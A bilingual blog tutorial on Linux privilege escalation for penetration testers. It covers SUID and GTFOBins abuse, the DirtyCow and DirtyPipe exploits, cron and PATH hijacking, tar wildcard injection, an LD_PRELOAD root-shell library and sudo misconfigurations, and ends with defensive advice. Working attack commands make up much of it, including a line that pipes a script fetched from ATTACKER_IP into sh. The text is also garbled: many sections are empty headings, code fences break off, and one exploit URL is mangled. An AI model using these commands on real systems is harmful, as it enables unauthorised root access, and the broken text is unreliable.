---
title: "Detailed explanation of privilege escalation techniques - SUID, kernel vulnerabilities, Cron scheduled task exploitation"
url: "en/linux-privilege-escalation"
date: "2026-01-13"
draft: false
summary: "Comprehensive analysis of Linux privilege escalation technology, SUID/SGID exploitation, kernel vulnerability privilege escalation, Cron task hijacking and LinPEAS automated enumeration"
authors: ["default"]
tags:
  - Linux
  - Elevate privileges
  - SUID
  - kernel vulnerability
images: ["https://images.unsplash.com/photo-1618401471353-b98afee0b2eb?auto=format&fit=crop&w=1200&q=80"]
categories:
  - cyber-security
---

# Detailed explanation of privilege escalation technology - SUID, kernel vulnerability, Cron scheduled task exploitation

In penetration testing, obtaining the initial Shell is often just a low-privileged user (such as www-data, nobody). To truly control the target system, we need to perform privilege escalation (Privilege Escalation) to upgrade the ordinary user privileges to root. Linux privilege escalation is a systematic technology, involving multiple dimensions such as file permissions, kernel vulnerabilities, and system configuration defects. This article will comprehensively explain various privilege escalation techniques in the Linux environment, from principles to practice, and help you master the complete path from low privileges to root.

## Linux permission model basics

Before we start escalating privileges, we need to understand the Linux permission model:

```bash
# 查看当前用户身份
id
whoami
groups

# 查看 /etc/passwd（所有用户）
cat /etc/passwd

# 查看 /etc/shadow（密码哈希，需root权限）
cat /etc/shadow

# Linux 权限体系核心概念：
# UID 0 = root（超级管理员）
# 文件权限：rwx (读/写/执行)
# 特殊权限：SUID(4), SGID(2), Sticky Bit(1)
# SUID：程序以文件所有者身份运行
# SGID：程序以文件所属组身份运行

# 查看文件权限
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 /usr/bin/passwd
# 's' 表示 SUID 位被设置，任何用户执行该程序时以 root 身份运行
```

## 提权信息收集

在尝试提权之前，首先需要全面了解目标系统的配置。

```bash
# 操作系统和内核信息
uname -a
cat /etc/os-release
cat /etc/issue
hostnamectl

# Current user permissions

# other users in the system

# Network information

# running process

# scheduled tasks

# Writable directories and files

# View environment variables

## SUID/SGID privilege escalation

SUID (Set User ID) is one of the most classic attack surfaces in Linux privilege escalation. When an executable file has the SUID bit set, any user who runs the program will execute as the file owner (usually root).

### Find SUID file

```bash
# 查找所有 SUID 文件
find / -perm -u=s -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -g=s -type f 2>/dev/null

# 同时查找 SUID 和 SGID
find / -perm -4000 -o -perm -2000 2>/dev/null

# 更详细的输出
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null

# 常见的正常 SUID 程序
# /usr/bin/passwd, /usr/bin/sudo, /usr/bin/mount, /usr/bin/ping
# 如果发现以下程序有 SUID 位，则可能被利用：
# /usr/bin/find, /usr/bin/vim, /usr/bin/python, /usr/bin/bash
# /usr/bin/nmap, /usr/bin/less, /usr/bin/cp, /usr/bin/env
```

### GTFOBins 利用

GTFOBins（https://gtfobins.github.io/）是一个收集了各种 Unix 二进制文件提权方法的项目。以下是常见的 SUID 提权示例：

```bash
# === find 提权 ===
# 如果 find 有 SUID 位
find . -exec /bin/sh -p \; -quit

# === vim privilege escalation ===

# === python privilege escalation ===

# === bash privilege escalation ===

# === nmap privilege escalation (old version) ===

# === env privilege escalation ===

# === less/more privilege escalation ===

# === cp privilege escalation ===

# Add to passwd file

# su switches to a new user

# === node privilege escalation ===

# === perl privilege escalation ===

# === ruby ​​privilege escalation ===

# === php privilege escalation ===

## Kernel vulnerability privilege escalation

When the system kernel version is older, there may be known kernel vulnerabilities that can directly obtain root privileges.

### Detect kernel version

```bash
# 查看内核版本
uname -r
uname -a
cat /proc/version

# 常见的可利用内核版本范围
# Linux 2.6.x - 3.x: 大量历史漏洞
# Linux 4.x: DirtyCow (CVE-2016-5195)
# Linux 5.x: DirtyPipe (CVE-2022-0847)
```

### DirtyCow（CVE-2016-5195）

DirtyCow 是 Linux 内核中一个存在了近 10 年的竞态条件漏洞，影响 Linux 2.6.22 至 4.8.3 之间的所有内核版本。

```bash
# 检查是否受影响
uname -r
# 如果版本在 2.6.22 - 4.8.3 之间，可能受影响

# Method 1: Use dirtycow to modify /etc/passwd

# compile

# Run (will create a new root user "firefart")

# Log in

# Method 2: Use cowroot

### DirtyPipe（CVE-2022-0847）

DirtyPipe affects Linux kernel versions between 5.8 and 5.16.11 and can overwrite any read-only file.

```bash
# 检查是否受影响
uname -r
# 需要 5.8 <= kernel < 5.16.11 (或特定修补版本)

# 下载利用代码
wget https://raw.githubusercontent.com/AlexisAhworworworworworworworworwor/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c

# 编译并运行
gcc exploit-1.c -o exploit
./exploit

# 方法：覆写 /etc/passwd 中 root 的密码字段获取 root
```

### 使用自动化工具检测内核漏洞

```bash
# linux-exploit-suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# linux-exploit-suggester2 (Python version)

## Cron scheduled task privilege escalation

Cron scheduled tasks are the task scheduling mechanism of Linux systems. If the script executed by the root user's cron task is writable by the current user, it can be exploited to escalate privileges.

### Discover exploitable cron tasks

```bash
# 查看系统级 crontab
cat /etc/crontab

# 查看所有 cron 目录
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 查看各用户的 cron 任务
ls -la /var/spool/cron/crontabs/

# 使用 pspy 监控进程（无需root权限）
# pspy 可以检测到定时任务执行时的进程
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

### 可写脚本提权

```bash
# 假设发现 /etc/crontab 中有以下条目：
# * * * * * root /opt/scripts/backup.sh

# Check script permissions

# Method 1: Write a rebound shell

# Attack aircraft monitoring

# Method 2: Add SUID bash

# Wait for cron to execute

# Method 3: Add the current user to sudoers

### PATH hijacking and privilege escalation

If a script in a cron task calls a command but does not use an absolute path, it can be hijacked by modifying the PATH environment variable.

```bash
# 假设 cron 脚本内容为：
# #!/bin/bash
# cd /tmp && tar czf /backup/backup.tar.gz *

# 如果 crontab 中 PATH 包含可写目录（如 /tmp 或 /home/user）
# 或者脚本中调用的命令没有使用绝对路径

# 创建恶意的 tar 命令
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/tar
chmod +x /tmp/tar

# 如果 PATH 中 /tmp 在 /usr/bin 之前
# cron 执行时会调用我们的假 tar

# 等待执行后
/tmp/rootbash -p

# === 通配符注入 ===
# 如果 cron 脚本中使用了通配符，如：
# tar czf /backup/backup.tar.gz *

# 可以利用 tar 的参数注入
cd /tmp
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> shell.sh
chmod +x shell.sh
```

## 环境变量提权

### PATH 劫持

```bash
# 如果发现 SUID 程序内部调用了系统命令（未使用绝对路径）
# 例如一个 SUID 程序调用了 "service apache2 restart"

# Use strings to view the commands called by the program

# Create malicious service commands

# Modify PATH (put /tmp first)

# Execute SUID program

### LD_PRELOAD Privilege Elevation

If the LD_PRELOAD environment variable is retained in the sudo configuration, it can be used to escalate privileges.

```bash
# 检查 sudo 配置
sudo -l
# 如果输出包含: env_keep += LD_PRELOAD

# 创建恶意共享库
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

# 编译为共享库
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# 使用 LD_PRELOAD 执行任意允许的 sudo 命令
sudo LD_PRELOAD=/tmp/shell.so find
# 获得 root shell
```

## Sudo 配置错误利用

`sudo -l` 是提权枚举中最重要的命令之一，它会显示当前用户可以以 root 身份运行哪些命令。

```bash
# 查看 sudo 权限
sudo -l

# === Commonly exploitable sudo configurations ===

# (root) NOPASSWD: /usr/bin/vim

# (root) NOPASSWD: /usr/bin/find

# (root) NOPASSWD: /usr/bin/python3

# (root) NOPASSWD: /usr/bin/perl

# (root) NOPASSWD: /usr/bin/ruby

# (root) NOPASSWD: /usr/bin/less

# (root) NOPASSWD: /usr/bin/awk

# (root) NOPASSWD: /usr/bin/man

# (root) NOPASSWD: /usr/bin/ftp

# (root) NOPASSWD: /usr/bin/socat

# (root) NOPASSWD: /usr/bin/zip

# (root) NOPASSWD: /usr/bin/tar

# (root) NOPASSWD: /usr/bin/env

# (root) NOPASSWD: /usr/bin/nano

# (root) NOPASSWD: /usr/bin/apache2

## Automated enumeration tools

### LinPEAS

LinPEAS is the most powerful Linux privilege escalation enumeration script, automatically detecting almost all possible privilege escalation paths.

```bash
# 下载 LinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# 在目标机器上运行
chmod +x linpeas.sh
./linpeas.sh

# 将输出保存到文件
./linpeas.sh | tee linpeas_output.txt

# 如果目标机器无法下载，可以通过攻击机传输
# 攻击机启动 HTTP 服务
python3 -m http.server 8000

# 目标机下载并执行
curl http://ATTACKER_IP:8000/linpeas.sh | sh

# LinPEAS 检测项目包括：
# - 系统信息和内核版本
# - 可利用的 SUID/SGID 文件
# - Sudo 配置错误
# - Cron 任务
# - 可写文件和目录
# - 敏感文件（密码、密钥）
# - Docker/LXC 容器逃逸
# - 内核漏洞建议
```

### LinEnum

```bash
# 下载并运行
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t

# verbose mode

### linux-smart-enumeration

```bash
# 下载
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh

# 不同级别的扫描
./lse.sh -l 0    # 只显示重要发现
./lse.sh -l 1    # 显示有趣的信息
./lse.sh -l 2    # 显示所有信息
```

## 安全建议与防御措施

1. **最小权限原则**：用户和进程只授予必要的最小权限
2. **定期审计 SUID 文件**：`find / -perm -4000 -type f`，移除不必要的 SUID 位
3. **严格管理 sudo 配置**：避免 `NOPASSWD`，限制可执行的命令范围
4. **及时更新内核**：关注 CVE 公告，及时修补内核漏洞
5. **审查 Cron 任务**：确保脚本权限正确（root 脚本只有 root 可写），使用命令绝对路径
6. **保护环境变量**：sudo 配置中使用 `env_reset`，移除 `LD_PRELOAD` 等危险变量
7. **部署 SELinux/AppArmor**：强制访问控制可以限制提权后的操作范围
8. **文件完整性监控**：使用 AIDE、Tripwire 等工具监控关键系统文件的变更
9. **日志审计**：开启详细的审计日志（auditd），监控异常的权限变更操作

## 总结

Linux 提权是渗透测试中至关重要的环节，也是安全攻防对抗的核心战场。本文系统地讲解了 SUID/SGID 提权、内核漏洞提权、Cron 定时任务利用、环境变量劫持、sudo 配置错误利用等多种提权技术，并介绍了 LinPEAS、LinEnum 等自动化枚举工具。提权的核心思路是发现系统配置中的"不一致"——权限配置错误、版本过旧、信任关系不当等。在实战中，建议综合使用自动化工具和手动检查，不遗漏任何可能的提权路径。下一篇文章我们将进入后渗透阶段，学习如何在获取 root 权限后维持访问、建立隧道和进行横向移动。

